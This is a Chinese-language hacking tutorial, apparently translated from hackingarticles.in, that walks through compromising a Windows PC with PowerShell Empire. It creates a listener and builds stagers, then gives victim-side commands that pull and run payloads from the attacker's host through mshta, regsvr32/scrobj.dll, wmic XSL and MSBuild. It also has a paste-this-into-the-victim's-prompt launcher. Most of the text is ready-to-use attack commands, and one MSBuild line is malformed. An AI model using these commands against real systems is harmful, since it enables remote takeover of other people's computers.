## 多种方法使用PowerShell Empire渗透Windows PC

### **通过HTA渗透** [^1]

```bash
# 创建侦听器
listeners
uselistener http
set Host http://192.168.1.110
execute
```

```bash
# 创建一个漏洞利用程序
back
usestager windows/hta
set Listener http
set OutFile /root/1.hta
execute
```

`python -m SimpleHTTPServer 8080` [^2]

`mshta.exe http://192.168.1.110:8080/1.hta` [^3]

### **通过MSBuild.exe渗透** [^4]

```bash
usestager windows/launcher_xml
set Listener http
execute
```

```bash
# 将此文件(/tmp/launcher.xml)复制到受害者的PC（在Microsoft.NET \ Framework \ v4.0.30319 \中）并运行它
cd C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe launcher.xml
```

### **通过regsvr32渗透**

```bash
usestager windows/launcher_sct
set Listener http
execute
```

`regsvr32.exe/u /n /s /i:http://192.168.1.107:8080/launcher.sct scrobj.dll`

### **通过XSL渗透**

```bash
usestager windows/launcher_xsl
set Listener http
execute
```

`wmic process get brief /format:"http://192.168.1.107:8080/launcher.xsl"`

### **通过Visual Basic脚本渗透**

```bash
usestager windows/launcher_vbs
set Listener http
execute
```

### **利用bat文件**

```bash
usestager windows/launcher_bat
use Listener http
set OutFile /root/1.bat
execute
```

**Multi_launcher** [^5]

```bash
usestager multi/launcher
set Listener http
execute
# 在上述命令之后按Enter键，它将为您提供代码。复制此代码并将其粘贴到受害者的命令提示符中，然后按Enter键。只要您按Enter键，您就会激活一个会话
```

[原文](https://www.hackingarticles.in/multiple-ways-to-exploiting-windows-pc-using-powershell-empire/)

---

[^1]: 这种攻击有助于我们通过.hta利用Windows。当.hta文件通过mshta.exe运行时，它以.exe文件的形式执行，就像我们之前那样
[^2]: 使用以下命令启动python服务器，以共享我们的.hta文件
[^3]: 当python服务器启动并运行时，在受害者的命令提示符下键入以下命令下载并执行我们的恶意文件，此时便建立了一个会话
[^4]: 我们的下一个漏洞是通过MSBuild.exe，它将允许您使用XML文件进行远程会话
[^5]: 它可以再次用于各种平台，如Windows，Linux等

